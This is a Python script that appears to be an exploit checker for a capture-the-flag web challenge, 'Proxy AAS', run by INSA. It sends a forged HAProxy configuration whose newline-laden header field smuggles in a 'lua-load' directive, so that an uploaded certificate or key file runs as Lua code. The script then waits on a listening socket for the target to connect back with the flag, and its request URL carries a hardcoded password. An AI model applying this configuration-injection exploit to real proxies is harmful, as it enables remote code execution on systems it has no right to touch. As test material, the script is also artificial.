#!/usr/bin/python3
import requests
import socket
import os

url = "https://proxy-aas.insecurity-insa.fr/"
f_p = os.path.dirname(__file__) + "/my_ip"
if not os.path.isfile(f_p):
    my_ip = requests.get("https://api.ipify.org").text
    with open(f_p, "w") as f:
        f.write(my_ip)
with open(f_p) as f:
    my_ip = f.read()

def exploitable():
    ssl_cert = ""
    ssl_key = ""
    with open(os.path.dirname(__file__) + "/ssl_cert") as f:
        ssl_cert = f.read()
        ssl_cert = ssl_cert.format(IP=my_ip)
    with open(os.path.dirname(__file__) + "/ssl_key") as f:
        ssl_key = f.read()
    data = {
        "ip_backend1": "51.254.102.54",
        "port_backend1": 1234,
        "ip_backend2": "51.254.102.54",
        "port_backend2": 4321,
        "ssl_cert": ssl_cert,   
        "ssl_key": ssl_key,
        "g-recaptcha-response": "nop",
        "http_headers": "Header1 Header1Value\n\nglobal\n    lua-load /etc/haproxy/ssl/ssl_pem\n\n"
    }

    # setup TCP server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "0.0.0.0"
    port = 4455
    s.bind((host, port))
    s.listen(1)

    r = requests.post(url + "?pswd=zTOkNv6AIFFTFuZLKFRPTdiTCwHIpvqtBlUuY4103lS2Xf8nnX", data=data)

    s.settimeout(15)
    clientSocket, addr = s.accept()
    data = clientSocket.recv(4096)
    return b'INSA{' in data


def alive():
    r = requests.get(url)
    return "Proxy AAS" in r.text


if __name__ == "__main__":
    print(alive() and exploitable())
